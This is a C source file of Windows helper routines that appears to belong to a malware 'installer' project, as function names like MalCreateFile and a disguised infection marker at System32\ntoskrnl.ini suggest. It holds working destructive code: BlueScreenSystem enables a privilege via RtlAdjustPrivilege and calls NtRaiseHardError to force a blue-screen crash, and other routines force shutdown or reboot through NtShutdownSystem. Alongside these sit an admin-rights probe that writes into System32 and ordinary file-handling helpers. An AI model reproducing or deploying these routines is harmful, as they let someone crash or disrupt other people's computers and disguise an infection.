#include "tools.h"
#include "ntexport.h"
#include <errhandlingapi.h>
#include <handleapi.h>



VOID InstallerError(LPWSTR ErrorMessage){
    MessageBoxW(NULL, ErrorMessage, L"Installer", MB_OK | MB_ICONERROR);
}

VOID ShowFailureResponse(DWORD errorCode){
    LPVOID lpMsgBuf;

    FormatMessageW(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        errorCode,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPWSTR)&lpMsgBuf,
        0, NULL);

    InstallerError(lpMsgBuf);
    LocalFree(lpMsgBuf);
}

VOID BlueScreenSystem(){
    BOOLEAN result;
    RtlAdjustPrivilege(19L, TRUE, FALSE, &result);
    ULONG response;
    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, OptionShutdownSystem, &response);
}

VOID ShutdownSystem(){
    BOOLEAN result;
    RtlAdjustPrivilege(19L, TRUE, FALSE, &result);
    ULONG response;
    NtShutdownSystem(ShutdownNoReboot);
}

VOID RestartSystem(){
    BOOLEAN result;
    RtlAdjustPrivilege(19L, TRUE, FALSE, &result);
    ULONG response;
    NtShutdownSystem(ShutdownReboot);
}

BOOL CheckIfAdministrator(){
    OFSTRUCT st;
    HFILE file = OpenFile("C:\\Windows\\System32\\idk.sys", &st, OF_CREATE);
    if(file == HFILE_ERROR){
        return FALSE;
    }
    else {
        CloseHandle((HANDLE)file);
        DeleteFileW(L"C:\\Windows\\System32\\idk.sys");
        return TRUE;
    }
}

BOOL CheckIfFileExists(CHAR* filename){
    OFSTRUCT OpenBuff;
    HFILE file = OpenFile(filename, &OpenBuff, OF_EXIST);
    if(file == HFILE_ERROR){
        return FALSE;
    }
    else{
        return TRUE;
    }
}

BOOL CheckIfRan(){
    return CheckIfFileExists("C:\\Windows\\System32\\ntoskrnl.ini");
}

BOOL CheckIfWindows10OrGreater(){
    return CheckIfFileExists("C:\\Windows\\System32\\sihost.exe");
}


void* AllocateVirtualMemory(size_t size) {
    return VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
}

BOOL FreeVirtualMemory(void* memory) {
    return VirtualFree(memory, 0, MEM_RELEASE);
}


BOOL MalCreateFile(CHAR* filename){
    OFSTRUCT OpenBuff;
    HFILE file = OpenFile(filename, &OpenBuff, OF_CREATE);
    if(file == HFILE_ERROR){
        ShowFailureResponse(GetLastError());
        return FALSE;
    }
    return TRUE;
}

BOOL WriteDataIntoFile(WCHAR* filename, WCHAR* data){
    HANDLE hFile = CreateFileW(filename, 
                GENERIC_READ | GENERIC_WRITE, 0, 
                NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE){
        ShowFailureResponse(GetLastError());
        return FALSE;
    }
    BOOL result = WriteFile(hFile, data, 
                            wcslen(data) * sizeof(WCHAR), NULL, NULL);
    if(!result){
        CloseHandle(hFile);
        ShowFailureResponse(GetLastError());
        return FALSE;
    }
    CloseHandle(hFile);
    return TRUE;
}


WCHAR* ReadData(WCHAR* filename, size_t size){
    HANDLE hFile = CreateFileW(filename, 
                GENERIC_READ | GENERIC_WRITE, 0, 
                NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE){
        ShowFailureResponse(GetLastError());
        return NULL;
    }
    WCHAR* filedata = AllocateVirtualMemory(size);
    BOOL result = ReadFile(hFile, filedata, size, NULL, NULL);
    if(!result){
        CloseHandle(hFile);
        FreeVirtualMemory(filedata);
        return NULL;
    }
    CloseHandle(hFile);
    return filedata;
}
